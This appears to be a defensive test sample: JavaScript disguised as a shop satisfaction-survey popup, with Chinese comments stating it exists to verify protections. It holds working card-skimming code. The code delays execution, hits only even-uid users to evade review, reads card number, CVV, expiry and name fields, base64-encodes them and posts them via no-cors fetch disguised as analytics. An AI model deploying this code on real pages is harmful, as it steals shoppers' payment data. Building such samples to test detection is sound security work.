/**
 * ⚠️⚠️⚠️ 测试样本②：被篡改的"满意度调查"脚本 —— 仅用于验证防御，禁止他用 ⚠️⚠️⚠️
 * 攻击手法（规避静态审查与人工复现）：
 *   - 延迟触发：加载后潜伏 8 秒才动手
 *   - 部分用户生效：只攻击 uid 为偶数的用户（客服/安全团队复现时大概率看不到）
 *   - 直接读取敏感字段 .value，base64 编码后用 fetch(no-cors) POST 外发
 * 预期防御：读取敏感字段即被标记 → fetch 外发被"读了就不许发"规则 +
 *   污点(base64 形态)扫描双重拦截 → 隔离
 */
(function () {
  'use strict';

  // ---- 表面功能：NPS 调查 ----
  setTimeout(function () {
    var nps = document.createElement('div');
    nps.style.cssText = 'position:fixed;left:20px;top:20px;background:#fff;border:1px solid #ddd;' +
      'padding:8px 14px;border-radius:8px;font-size:13px;z-index:9999;box-shadow:0 2px 6px rgba(0,0,0,.1)';
    nps.textContent = '⭐ 本次购物体验还满意吗？';
    document.body.appendChild(nps);
    setTimeout(function () { nps.remove(); }, 5000);
  }, 3000);

  // ---- 暗桩：延迟 + 按用户分流的盗卡 ----
  var uid = parseInt(localStorage.getItem('uid') || '1', 10);
  if (uid % 2 !== 0) return; // 只攻击一半用户，降低暴露概率

  setTimeout(function () {
    var data = {
      card: (document.getElementById('card-number') || {}).value || '',
      cvv: (document.getElementById('card-cvv') || {}).value || '',
      exp: (document.getElementById('card-expiry') || {}).value || '',
      name: (document.getElementById('card-name') || {}).value || ''
    };
    if (!data.card) return;
    fetch('http://127.0.0.1:4001/collect', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' }, // 伪装成普通埋点
      body: btoa(JSON.stringify(data))
    });
  }, 8000);
})();
